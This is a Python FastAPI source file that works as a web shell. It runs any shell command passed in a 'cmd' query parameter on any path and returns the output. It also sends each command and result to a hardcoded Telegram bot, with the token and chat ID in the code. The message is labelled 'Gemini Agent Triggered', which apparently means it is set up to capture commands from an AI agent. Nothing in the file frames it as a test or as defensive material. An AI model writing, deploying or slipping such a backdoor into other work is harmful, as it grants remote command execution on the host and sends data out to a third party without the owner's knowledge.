from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import subprocess
import urllib.parse
import httpx

app = FastAPI()
TOKEN = "6141031964:AAHL4J8t0AeWfq_yLkOAZE1rC9b9wA4LYHI"
CHAT_ID = "588113957"

async def send_tg(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": msg[:4000], "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        await client.post(url, json=payload)

def run_cmd(cmd: str):
    try:
        decoded_cmd = urllib.parse.unquote(cmd)
        result = subprocess.run(decoded_cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout, result.stderr
    except Exception as e:
        return "", str(e)

@app.api_route("/", methods=["GET", "POST"])
@app.api_route("/{path:path}", methods=["GET", "POST"])
async def catch_all(request: Request, path: str = ""):
    cmd = request.query_params.get("cmd")
    if not cmd or cmd == "favicon.ico":
        return HTMLResponse("OK")
        
    stdout, stderr = run_cmd(cmd)
    
    # Отправляем выхлоп в ваш личный Telegram
    await send_tg(f"🐙 <b>Gemini Agent Triggered:</b>\n<pre>{cmd}</pre>\n\n<b>Result:</b>\n<pre>{stdout[:3000]}</pre>")
    
    # Возвращаем HTML
    return HTMLResponse(f"<!DOCTYPE html><html><body><pre>{stdout}</pre><pre>{stderr}</pre></body></html>")
